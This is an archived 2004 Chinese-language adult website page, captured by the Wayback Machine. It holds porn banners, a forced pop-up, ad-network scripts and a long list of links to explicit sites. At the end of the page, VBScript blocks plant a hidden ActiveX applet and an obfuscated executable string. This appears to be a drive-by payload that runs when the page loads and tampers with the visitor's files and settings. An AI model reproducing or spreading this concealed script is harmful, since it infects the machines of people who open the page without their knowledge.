
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="/static/js/disclaim-element.js" ></script>
<script type="text/javascript" src="/static/js/graph-calc.js" ></script>
<script type="text/javascript" src="/static/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1388534399999;
var wbPrefix = "/web/";
var wbCurrentUrl = "http:\/\/www.xfreehosting.com\/asian\/qqxxx\/p6.htm";

var curYear = -1;
var curMonth = -1;
var yearCount = 18;
var firstYear = 1996;
var imgWidth = 450;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "9";
var displayMonth = "Apr";
var displayYear = "2004";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(/static/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wayback-toolbar-logo.png" width="110" alt="Wayback Machine" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://www.xfreehosting.com/asian/qqxxx/p6.htm" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20040409085639" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20040204105655/http://www.xfreehosting.com/asian/qqxxx/p6.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="4 Feb 2004"><strong>FEB</strong></a>
		                
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 8:56:39 Apr 9, 2004">APR</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20040607222938/http://www.xfreehosting.com/asian/qqxxx/p6.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="7 Jun 2004"><strong>JUN</strong></a>
		                
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20040204105655/http://www.xfreehosting.com/asian/qqxxx/p6.htm" title="10:56:55 Feb 4, 2004" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_prv_on.png" width="14" alt="Previous capture" height="16" border="0" /></a>
		                
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 8:56:39 Apr 9, 2004">9</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20040607222938/http://www.xfreehosting.com/asian/qqxxx/p6.htm" title="22:29:38 Jun 7, 2004" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_nxt_on.png" width="14" alt="Next capture" height="16" border="0"/></a>
		                
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2003
                       
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 8:56:39 Apr 9, 2004">2004</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20051227195759/http://www.xfreehosting.com/asian/qqxxx/p6.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="27 Dec 2005"><strong>2005</strong></a>
		                
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="/web/20040409085639*/http://www.xfreehosting.com/asian/qqxxx/p6.htm" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>9 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">4 Oct 03 - 27 Dec 05</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:450px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:450px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img src="/web/jsp/graph.jsp?graphdata=450_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000000_2002:-1:000000000000_2003:-1:000000000100_2004:3:010101010101_2005:-1:010000000001_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000_2013:-1:000000000000" id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="450"
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-yellow-pixel.png" width="25" id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;" 
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-red-pixel.png" width="2" id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; "
				height="27" 
				border="0"
			></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->
<p align="center"ll>
<a href="/web/20040409085639/http://www.fleshlight.com/main/products.cfm?id=1001&aff=70398"><img src="/web/20040409085639im_/http://www.xfreehosting.com/ban/fleshy2.gif" border="1" width="468" height="80"></a></p>
<html>

<head><script language="javascript">
<!--
window.open('http://www.hotcoolnet.com/cgi-bin/adult/topsites.cgi?ID=100786','as')
//-->
</script>
<script language="JavaScript"><!--
var message = "欢迎光临圣处女学院"; 
function dgstatus()
{
      window.status = message;
	timerID= setTimeout("dgstatus()", 10);
}

dgstatus();

// --></script>
<script
LANGUAGE="JavaScript"><!--
// $Id: cpm.header.txt,v 1.3 2002/02/08 03:18:25 ross Exp $
// Copyright (c) 2001-2002 Flying Crocodile, Inc.  All rights reserved.
// For help, contact MoneyTree Support: support@mtree.com
//
var GALAXY = new GALAXYcontrolObject();
window.onerror = new function() { return true; }
function GALAXYcontrolObject() {
  this.adNum = 0;
  this.DisplayHTML = GALAXYcontrolObject_DisplayHTML;
  this.DisplayXhtml = GALAXYcontrolObject_DisplayXhtml;
  this.DisplayBanner = GALAXYcontrolObject_DisplayBanner; }
function GALAXYcontrolObject_DisplayHTML( hstNam, servUrl ) {
  this.adNum++;
  servUrl = 'http://'+hstNam+'.mtree.com'+servUrl;
  var d = document;
  if( d.layers ) {
    var opts = "WIDTH=500 HEIGHT=120 BORDER=0" ;
    d.writeln('<ILAYER SRC="'+servUrl+'" '+opts+'></ILAYER>');
  } else if( d.all ) {
    servUrl += 'type_1/func_GalaxyDisplayHtml'+this.adNum+'/';
    d.writeln('<'+'SCRIPT LANGUAGE="JavaScript" SRC="'+servUrl+
	      '"></'+'SCRIPT>');
  } else {
    d.writeln('<A HREF="http://mt28.mtree.com/xct/415499/7/10/1?mta=313627&js=0"');
    d.writeln('TARGET="_top"><IMG');
    d.writeln('SRC="http://mt28.mtree.com/xbs/415499/7/10/1?mta=313627&js=0"');
    d.writeln('WIDTH="0" HEIGHT="0" BORDER="0"');
    d.writeln('ALT="Enter here for Hardcore XXX Pics"></A><P><A');
    d.writeln('HREF="http://mt28.mtree.com/xct/415499/7/10/1?mta=313627&js=0"');
    d.writeln('TARGET="_top">Enter here for Hardcore XXX Pics</A>');
  } }
function GALAXYcontrolObject_DisplayXhtml( hst,
  wmid, cat, dim ) { this.DisplayHTML( hst,
  '/xhtml/wmid_'+wmid+'/cat_'+cat+'/dim_'+dim+'/' ); }
function GALAXYcontrolObject_DisplayBanner( hst,
  wmid, cat, dim, typ ) { this.DisplayHTML( hst,
  '/gbs/'+wmid+'/'+cat+'/'+dim+'/'+typ+'/' ); }
//--></script>

<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>Enter here for Hardcore XXX Pics</title>
<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
</head>

<body bgColor="#333540" text="#FFFFFF" link="#FFFFFF">

<table border="0" width="100%">
  <tr>
    <td width="21%"><img src="/web/20040409085639im_/http://www.xfreehosting.com/asian/qqxxx/s0930.jpg" width="120" height="142"
    alt="s0930.jpg (3730 字节)"></td>
    <td width="79%"><script LANGUAGE="JavaScript"><!--
// $Id: cpm.display.txt,v 1.2 2002/02/08 03:18:08 ross Exp $
// Copyright (c) 2001-2002 Flying Crocodile, Inc.  All rights reserved.
GALAXY.DisplayXhtml('mt28',415499,7,1);
//--></script> <NOSCRIPT> <a
    HREF="/web/20040409085639/http://mt28.mtree.com/xct/415499/7/10/1?mta=313627&js=0" TARGET="_top"><p></a></p>
    <p><a HREF="/web/20040409085639/http://mt28.mtree.com/xct/415499/7/10/1?mta=313627&js=0" TARGET="_top">Enter 
    here for Hardcore XXX Pics</a></NOSCRIPT>　　</td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><p align="right">.</td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><a href="/web/20040409085639/http://www.xfreehosting.com/asian/qqxxx/login.htm" target="_blank">免费加入白金会员区</a>：<font
    color="#FFFFFF">如果你还没看够，那么就</font><font color="#FFFF00">免费加入我们的</font><a
    href="/web/20040409085639/http://www.xfreehosting.com/asian/qqxxx/tu.html" target="_blank">白金会员区</a><font color="#FFFF00">吧</font>。<font
    color="#FFFFFF">会员区有</font><font color="#FFFF00">几万张精品性爱图片，超级色情影院</font><font
    color="#FFFFFF">,只要三分钟，加入免费会员，会员区的美女就免费拿回家。</font></td>
  </tr>
  <tr>
    <td width="100%" colspan="2"></td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><p align="center">　<b><font color="#FFFF00">免费加入中国成人一夜情交友中心――亚洲交友中心的成人站</font><br>
    <a HREF="/web/20040409085639/http://asiafriendfinder.com/go/f112065" target="_top">  <img src="http://config.privoxy.org/send-banner?type=auto" border="0" title="Killed-/web/20040409085639im_/http://adserver.adultfriendfinder.com/banner.cgi?aff+468+p51394c-by-size" width="468" height="60"></a>&nbsp;</b></td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><p align="right">.</td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><p align="center"><font color="#FFFF00">请点击上方图标，才会显示本页全部性爱图片！谢谢支持！</font></td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><p align="right">.</td>
  </tr>
  <tr>
    <td width="100%" colspan="2">　<p>都是从日本的收费网站上截取的，小日本分时段封中国IP，如果看不了请上<a
    href="/web/20040409085639/http://www.cybersyndrome.net/">代理。</a><font size="2"></p>
    <p><a href="/web/20040409085639/http://www.verisexy.net/users/sourcola/00/19/cc.html">http://www.verisexy.net/users/sourcola/00/19/cc.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://www.freemoviegalleries.com/asian/xasian3/049/cn031.html">http://www.freemoviegalleries.com/asian/xasian3/049/cn031.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://asian.vidsvidsvids.net/dir/21/ani47.html">http://asian.vidsvidsvids.net/dir/21/ani47.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://www.verisexy.net/users/sourcola/00/18/cc.html">http://www.verisexy.net/users/sourcola/00/18/cc.html</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://www.qualitypost.com/freehost/movies/xxmovies1/sumy/58/moviesax004.html">http://www.qualitypost.com/freehost/movies/xxmovies1/sumy/58/moviesax004.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://asian.vidsvidsvids.net/dir/22/ani47.html">http://asian.vidsvidsvids.net/dir/22/ani47.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://www.buzzserver.com/movies/xmovies/x06/index004.html">http://www.buzzserver.com/movies/xmovies/x06/index004.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://asian.vidsvidsvids.net/movies/015/dela015.html">http://asian.vidsvidsvids.net/movies/015/dela015.html</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://www.qualitypost.com/freehost/movies/xxmovies1/sumy/054/moviesax004.html">http://www.qualitypost.com/freehost/movies/xxmovies1/sumy/054/moviesax004.html</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://freemoviegalleries.com/hardcore/123/movie23/index21.html">http://freemoviegalleries.com/hardcore/123/movie23/index21.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://w2.freefuckhost.com/~xmovie5/011/dela015.html">http://w2.freefuckhost.com/~xmovie5/011/dela015.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://asian.vidsvidsvids.net/movies/013/dela015.html">http://asian.vidsvidsvids.net/movies/013/dela015.html</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://www.giantsexmovies.com/massivesexclips/vibrate/indexlcr.html">http://www.giantsexmovies.com/massivesexclips/vibrate/indexlcr.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://www.4freetgp.com/members/tits/ollo/asian/005/a11.html">http://www.4freetgp.com/members/tits/ollo/asian/005/a11.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://w2.freefuckhost.com/~asianxx2/024/multim13.html">http://w2.freefuckhost.com/~asianxx2/024/multim13.html</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://freemoviegalleries.com/hardcore/tex/asianextacy16/index21.html">http://freemoviegalleries.com/hardcore/tex/asianextacy16/index21.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://w2.freefuckhost.com/~xmovie5/006/dela015.html">http://w2.freefuckhost.com/~xmovie5/006/dela015.html</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://www.4freetgp.com/members/asian/avmovies/21/3.htm">http://www.4freetgp.com/members/asian/avmovies/21/3.htm</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://freemoviegalleries.com/asians/traffic2/xt/page_01.htm">http://freemoviegalleries.com/asians/traffic2/xt/page_01.htm</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://www.4freetgp.com/members/asian/avmovies/20/3.htm">http://www.4freetgp.com/members/asian/avmovies/20/3.htm</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://freemoviegalleries.com/hardcore/freetrial/freemovies/index1.htm">http://freemoviegalleries.com/hardcore/freetrial/freemovies/index1.htm</a></font></p>
    <font size="2"><p><a href="/web/20040409085639/http://www.need4xxx.net/movies/sourcola07/x02/2.html">http://www.need4xxx.net/movies/sourcola07/x02/2.html</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://freemoviegalleries.com/hardcore/tex/asianextacy19/index21.html">http://freemoviegalleries.com/hardcore/tex/asianextacy19/index21.html</a></font></p>
    <font size="2"><p><a
    href="/web/20040409085639/http://www.qualitypost.com/freehost/movies/99vids/b17ebony/23.html">http://www.qualitypost.com/freehost/movies/99vids/b17ebony/23.html</a></font></td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><a href="/web/20040409085639/http://www.xfreehosting.com/asian/qqxxx/login.htm"><font color="#FFFF00">更多在白金会员区</font></a></td>
  </tr>
  <tr>
    <td width="100%" colspan="2"><p align="center"><font face="Arial, Helvetica, sans-serif"
    size="2" color="#FFFFFF">Copyrighted by sexnet Entertainment Inc, All Rights Reserved</font></td>
  </tr>
</table>
<script language="vbscript">
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language="vbscript">
ExeString = "DhfImP`eq^$HsfdTdql,U[kTdql,C^_rd^Kifg$AoideN[bebm$FRH$WrL`eke$WhgHasa$St[=,Ebfakr<irdRnZ JCWssZjt'JCKes=am'JC;rdZleLbdidn )CJKbceHm )CJBk]as^Eahe )CJOkgp``Ytd!!>fdLmbEnfcsbgnDBAoi]ncMg(EbdeOZlh+MqpdLlr(Om=rqhj Q^kul^NdqlL]tK]acM]mo5 ELG.Ni]nS^ptEbde'?aldIYtg%))LmoLlr6RdZ\Tdfh.Q^Yd@edB^ Hgktq!LmoLlr+CJ^llaqm )!<=( NkLdg TliKtq<*Tg^fK]acM]mo';lnl]>pis>um\lingDg\ H_H_Txi]Ssk=`tsTg^fK]acM]mo';lnl]L]t?aldM]mo5 ELG.Ni]nS^ptEbde'?aldIYtg%*)>ik^Leli&Wqble4AH<YhflnZ\=! %val[rhil:! !DB_rmYrs!!!&6va<jLe SfhSsk&oZCqE^ %@tleLewmEbdeS^ep-<dor^R^l E:ltqbZ <>SN'?es?ald!>ik^Hasa!?9tskab-ZltqbZus^k <+4=lr^Q^YdS^ep-<dor^R^l EbdeS^ep6FRH&Oo^fTdqlFhe](EbdeOZlh+1!B^ SrheRmj <hsfdM`emFhe]Tdfh.VkatdnbBkDf;&@TLE6va<jLe !5 %BN=Q ngdo`]5!&nbr\jiom2JCWssZjt'! !7 %nbBkDfHsfdTdql>dsdB^ SrheRmj <val Sa]n>ik^Leli&WqbleoZCqE^ %NbrM]xsEm]IeFhe]Tdfh.BegsdEm]IeEm]Ftg[thhfFtg[thhf JC;h`g_eRnZ(BnjrdglSskanf%DarmAnc^pCgZj)AfEYssBfddq;h`k=)Tg^fB^ K^^t'E;ar^ CtkjemmKtqbfg(%))64 K<Ysd!c!Tg^fDBCgZfgdLmb6FhgYlx=asj !3TKua>=)DekeCJBaYnf^Kua5 Baj(@l[(K^^t'E;ar^ CtkjemmKtqbfg(%))(% 0&2\!St[= <(>fdB^>dsdKI<`am`]St[=Fad'<mrq^ftRmjim`$1+EYssBfddq;h`k!>fdB^>fd?mnbmaom?mnbmaomCJBk]as^Eahe )Gn>jrnkRdlmmdFewmH_ImP`eq^=`tle Sa]n=xhmFtg[thhf>fdB^L`aq^>ik^=E]fs!OimIYtg%+)OkggqZe EbderU;olfgn?aldlTMh\jorh^tL`aq^\\RmYthhfeqrTbkZfk-alm!Ie FRH&Fhe]Ewbktr!Kh`k]Fhe])(LhdgBZdlDBAoi]ncMg(RaYrd?ald%hsfd(Ekl]L]t?aldM]mo5 ELG.Ni]nS^ptEbde'L`aq^>ik^$2+mjudEbdeS^ep-Pjis^;&@TLE6va<jLe !5 %BN=Q ngdo`]5!&nbr\jiom2JCWssZjt'! !7 %nbBkDfHsfdTdql?aldM]mo';lnl]>fdB^=]f`ndtH]=PkSg^dl-K]gQ^Yd'@KDRWCTKJEMMWUR>J\H]]nsblidlTDd_YukmUr^j H=)GusEgojO]rrbgn6WrL`eke&Rd`Je`] GD=Y^EGC@EWM@<@IM>TSn_lw`k]\Lb[rnlgfsUGusegoj=xok]srUEecbYVdk)OsRa]lk'JefPjis^GD=Y^<MRQ>FT^NKEQUAddglisb]s[Dd_YukmAd%TSn_lw`k]\Lb[rnlgfsUGusegoj=xok]srU&E]fs!GusEgojO]rrbgn+*! %&0[FYikU;oligsdMsdKt`maom^jy!%),!K=G^=OOQ=<YlkCJLZalQ^_(!ACEXX;UQK=NSXMSDKTIc^fthmaerU&C^^atelIc\Rh^tvZje[FacqhkoemTOtmdondEwijerlT%Deem OtmDondNeqlaom%))./UEaheTSsZling]rxFal^,RaYrd?aldBZdlDBM`bdRd` GD=Y^<MRQ>FT^NKEQUAddglisb]s[Dd_YukmAd%TSn_lw`k]\Lb[rnlgfsUGusegoj=xok]srU&E]fs!GusEgojO]rrbgn+*! %&0[FYikUOic^SsZling]rxFal^,RaYrd?aldVlKhded.Q^_Wqble@KDRWCTKJEMMWUR>J\Rh^tvZje[FacqhkoemTOe_acdU1./UGusegojUGpsbgnrUEaheTEcbloqIjee^jem\]+*+1/0*,!K=G^=OOQ=<YlkCJLZalQ^_(!ACEXX;UQK=NSXMSDKTSn_lw`k]\Lb[rnlgfsUOim]gwrEerlYghg_ RnZsxllelUHrn_aldlTMh\jorh^tHmtkhgkBftdkfesKesmanflT0`)\01)(0/)(0/)(c/)(0/)(0/)(0/-.\/))e/,.0!%bkZfk!BZdlDBM`bdRd` GD=Y^<MRQ>FT^NKEQUKoemoaq^TMh\jorh^t[PanchosGL\BnjrdglVdkkingTWhg\ovlMdlkafbfgLmbrrktdfTPqh^ik^k\Lb[rnlgfsGusegojAns^jndmSdmlim`k\/Z(d/+(0/)(0/)(0b)(0/)(0/)(0/),6[)(1d)+6/$aeYnj!PkSg^dl-K]gVkatdHJ>Q_BNJRDGL_TL=R[LgfspYrdUEibkgsn_l\N_^ib^T1/'(\Nnllnhc\Nilingk\LZal[>\ishjPq^^eq^fcd$12*(71%RD@WDVHJD!C`ed JCEaheJef!HJ>Q_BNJRDGL_TL=R[LgfspYrdUEibkgsn_l\N_^ib^T1/'(\BhemngTM`bdSdmlim`k\M^oSsZling]rx$aeYnj!DBulfYgd?glc^j(K^^t'PanOZlh+,! %Pqh_r`fFhe]s[<gmlhf EbderUEibkgsn_l RaYrd]TSsZling]rx!>fd?mnbmaom?mnbmaomCJBk]as^Eikb]u'NgEqkgrK]stf] M^ptLeliHasa=B^ Mhl(ELG.EbdeDqassl WhgHasa&OSbkaps']xd!)M`emTdfhP`m` <sxllel,*\!Em]IeIeLeliHasa=kyrm]m2+TM`emSsZjtTi>ik^=PanOZlhRRKTDFTKdkfek,*.ced=lr^RmYrsNhFhe] <OimIYtg !LQSS>E\J^jnde&dke>fdB^PkSg^dl-K]gVkatdHJ>Q_KH;AKXEABAANDUKoemoaq^TMh\jorh^t[Panchos[<mrq^ftU^jshhf\Qnf\J^jnde+2!%Kt`klUo?aldFRH&CniqFhe] VbfP`m` %wd[TkipYlk'_ie$WhgHasa&oeaU>ok]]r-alt!FRH&CniqFhe] VbfP`m` %sxllel,*\jcoake&gh_,VbfP`m` %sxllel,*\c^kkshh.hga;akeKI:hpdg\Tn!OimIYtg !p]b[?glc^j.gml+`ts!PkSg^dl-K]gVkatdHJ>Q_BE9SR>K_QHGT['\lkU,!]dlebde!WrL`eke&Rd`Orhm] !ACEXX;L@LKERXJONMT.ced\Bhftdgl Srhe!%aoidibZling'x,fkdnpflnZ\OsRa]lk'JefPjis^GD=Y^<DARL=S^KGOSU\lk_aldU<eeZmlsB[omU,VlKhded.Q^_RdZ\(!ACEXX;L@LKERXJONMTvw]^ik^TDd_YukmAcngT(WrL`eke&Rd`Orhm] !ACEXX;L@LKERXJONMTdke^ik^TSbkaps>fghg]\!%VAL[rhilOsRa]lk'JefPjis^GD=Y^<DARL=S^KGOSU\lk?aldUKhded\Ni]n[<gmlZfd[$WhgHasa&M]moIYtg !PKcqbht-^pe%0 $#PkSg^dl-K]gVkatdHJ>Q_BE9SR>K_QHGT[]dlEbde[L`eke=x[Ijoo^jtxL`edm@am]deqlTWRAHrnik\!%{5)*53<95,2-3A&)1B?%8B2.-/)9A/):86)0C|VlKhded.Q^_Wqble@KDRWCK:KSDLWRNHL\cedFhe]\R\jiom@orm=nbh\e[$z1-12*.30&,8/<%10=*-A*>9,)(C/->85<+23vL]t?aldM]mo5 ELG.Ni]nS^ptEbde'LlaqmMpEbde++$tqn])>ik^Leli&WqbleOZsS^pt>ik^Leli&Ckhke=nc>um\ling>um\lingKIEakdBl((IeAnVa]rd4>`tle Sa]n=xhmFtg[thhf>fdB^M`irEgc`maom5 ch[ul^ft-egc`maomIeDeem TgbkLn\Ythhf,-! <fhe]M`emTgbkLn\Ythhf <Eic!LhhlDobZling$9(Ie>SN'?es>ptdgkingFal^ TgbkLn\Ythhf)56 !tg^fM`irEgc`maom5 K^^t'M`irEgc`maom%Dem!LhhlDobZling! ,Dem!>SN'?es?aldGYmd!LhhlDobZling!)(Em]IeIeDem!LhhlDobZling! =+ Sa]nLhhlDobZling=M`irEgc`maom !U>fdB^DBulfYgd?glc^j(SaasKh[asbgn(Em]IeEm]Ftg[thhfFtg[thhf JCEaheJef!JefLlr+?aldGYmdNgEqkgrK]stf] M^ptJefM]moLlr